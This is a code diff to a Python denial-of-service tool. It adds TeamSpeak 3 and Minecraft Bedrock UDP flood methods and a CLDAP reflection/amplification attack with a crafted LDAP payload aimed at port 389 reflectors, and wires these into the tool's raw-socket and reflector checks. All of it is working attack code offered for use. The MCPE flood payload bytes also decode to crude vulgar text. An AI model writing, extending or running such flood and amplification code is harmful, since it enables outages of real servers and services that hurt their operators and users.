@@ -84,7 +84,8 @@ class Methods:
 
     LAYER4_METHODS: Set[str] = {
         "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM", "NTP", "DNS", "ARD",
-        "CHAR", "RDP", "MCBOT", "CONNECTION", "CPS", "FIVEM"
+        "CHAR", "RDP", "MCBOT", "CONNECTION", "CPS", "FIVEM", "TS3", "MCPE",
+        "CLDAP"
     }
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
 
@@ -291,6 +292,8 @@ class Layer4(Thread):
         if name == "UDP": self.SENT_FLOOD = self.UDP
         if name == "SYN": self.SENT_FLOOD = self.SYN
         if name == "VSE": self.SENT_FLOOD = self.VSE
+        if name == "TS3": self.SENT_FLOOD = self.TS3
+        if name == "MCPE": self.SENT_FLOOD = self.MCPE
         if name == "FIVEM": self.SENT_FLOOD = self.FIVEM
         if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
         if name == "CPS": self.SENT_FLOOD = self.CPS
@@ -300,6 +303,11 @@ class Layer4(Thread):
             self._amp_payload = (
                 b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                 3389)
+            self.SENT_FLOOD = self.AMP
+            self._amp_payloads = cycle(self._generate_amp())
+        if name == "CLDAP":
+            self._amp_payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
+                                 b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00', 389)
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
         if name == "MEM":
@@ -421,6 +429,25 @@ class Layer4(Thread):
     def FIVEM(self) -> None:
         global BYTES_SEND, REQUESTS_SENT
         payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
+        with socket(AF_INET, SOCK_DGRAM) as s:
+            while Tools.sendto(s, payload, self._target):
+                continue
+        Tools.safe_close(s)
+
+    def TS3(self) -> None:
+        global BYTES_SEND, REQUESTS_SENT
+        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
+        with socket(AF_INET, SOCK_DGRAM) as s:
+            while Tools.sendto(s, payload, self._target):
+                continue
+        Tools.safe_close(s)
+
+    def MCPE(self) -> None:
+        global BYTES_SEND, REQUESTS_SENT
+        payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
+                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
+                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
+                   b'\x73')
         with socket(AF_INET, SOCK_DGRAM) as s:
             while Tools.sendto(s, payload, self._target):
                 continue
@@ -768,9 +795,9 @@ class HttpFlood(Thread):
 
     def DYN(self):
         payload: str | bytes = str.encode(self._payload +
-                                "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
-                                self.randHeadercontent +
-                                self.SpoofIP +"\r\n")
+                                          "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
+                                          self.randHeadercontent +
+                                          self.SpoofIP + "\r\n")
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -1355,7 +1382,7 @@ if __name__ == '__main__':
                     if port > 65535 or port < 1:
                         exit("Invalid Port [Min: 1 / Max: 65535] ")
 
-                    if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
+                    if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN"} and \
                             not ToolsConsole.checkRawSocket():
                         exit("Cannot Create Raw Socket")
 
@@ -1371,7 +1398,7 @@ if __name__ == '__main__':
                         argfive = argv[5].strip()
                         if argfive:
                             refl_li = Path(__dir__ / "files" / argfive)
-                            if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
+                            if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                                 if not refl_li.exists():
                                     exit("The reflector file doesn't exist")
                                 if len(argv) == 7:
